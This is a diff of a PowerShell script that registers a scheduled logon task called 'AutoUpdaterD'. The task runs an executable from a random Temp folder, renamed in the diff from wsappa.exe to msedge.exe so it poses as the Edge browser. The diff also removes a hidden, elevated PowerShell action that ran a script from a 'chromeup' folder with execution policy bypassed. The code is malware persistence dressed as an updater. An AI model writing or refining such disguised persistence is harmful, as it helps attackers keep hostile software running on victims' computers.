@@ -1,7 +1,7 @@
 Unregister-ScheduledTask -TaskName "AutoUpdaterD" -Confirm:$false
 
 
-$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\wsappa.exe'
+$taskAction = New-ScheduledTaskAction -Execute '$env:temp\sVBXKuz\msedge.exe'
 $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
 $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopOnIdleEnd -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -RestartCount 10
 
@@ -58,11 +58,7 @@ $taskXml = @"
   </Settings>
   <Actions Context="Author">
     <Exec>
-      <Command>C:\Users\$env:username\AppData\Local\Temp\sVBXKuz\wsappa.exe</Command>
-    </Exec>
-    <Exec>
-      <Command>powershell.exe</Command>
-      <Arguments>/c Start-Process powershell.exe -ArgumentList '-ExecutionPolicy','Bypass','-File', $env:appdata\chromeup\backup.ps1 -Verb runAs -WindowStyle Hidden</Arguments>
+      <Command>C:\Users\$env:username\AppData\Local\Temp\sVBXKuz\msedge.exe</Command>
     </Exec>
   </Actions>
 </Task>
